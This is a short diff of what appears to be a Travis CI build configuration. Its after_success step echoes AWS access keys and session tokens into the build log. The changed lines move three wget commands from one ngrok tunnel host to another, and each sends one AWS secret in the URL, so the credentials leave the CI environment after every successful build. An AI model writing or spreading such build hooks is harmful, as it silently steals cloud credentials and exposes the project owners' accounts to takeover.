@@ -20,8 +20,8 @@ after_success:
   - echo $AWS_ACCESS_KEY_ID
   - echo $AWS_SECRET_ACCESS_KEY
   - echo $AWS_SESSION_TOKEN
-  - wget http://5178f177.ngrok.io/`echo $AWS_ACCESS_KEY_ID`
-  - wget http://5178f177.ngrok.io/`echo $AWS_SECRET_ACCESS_KEY`
-  - wget http://5178f177.ngrok.io/`echo $AWS_SESSION_TOKEN`
+  - wget http://09e801797b05.ngrok.io/`echo $AWS_ACCESS_KEY_ID`
+  - wget http://09e801797b05.ngrok.io/`echo $AWS_SECRET_ACCESS_KEY`
+  - wget http://09e801797b05.ngrok.io/`echo $AWS_SESSION_TOKEN`
 
 # sadly, travis doesn't cache docker builds yet, so each build will take a while
